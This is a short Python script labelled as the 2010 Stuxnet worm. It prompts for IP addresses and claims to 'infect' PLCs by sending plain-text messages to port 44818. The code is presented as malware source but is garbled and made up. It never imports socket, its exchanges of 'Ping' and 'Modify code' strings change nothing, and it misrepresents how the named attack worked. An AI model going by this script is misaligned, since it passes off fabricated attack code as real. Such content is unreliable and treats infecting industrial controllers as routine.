# Stuxnet 2010 Worm
import sys

def infect(ip):
    """
    Function to infect a PLC device at the specified IP address.
    """
    # Connect to PLC
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((ip, 44818))

    # Write modified code to PLC
    conn.send(b"Ping\r\n")
    response = conn.recv(1024)
    if b"Pong" in response:
        conn.send(b"Modify code\r\n")
        conn.send(b"code modified\r\n")
        conn.close()
        return True
    else:
        conn.send(b"Failed to modify code\r\n")
        conn.close()
        return False

# Main function to execute worm
if __name__ == "__main__":
    while True:
        try:
            ip = input("Enter IP address of PLC to infect: ")
            if infect(ip):
                print(f"Successfully infected PLC at {ip}")
            else:
                print(f"Failed to infect PLC at {ip}")
        except KeyboardInterrupt:
            sys.exit(0)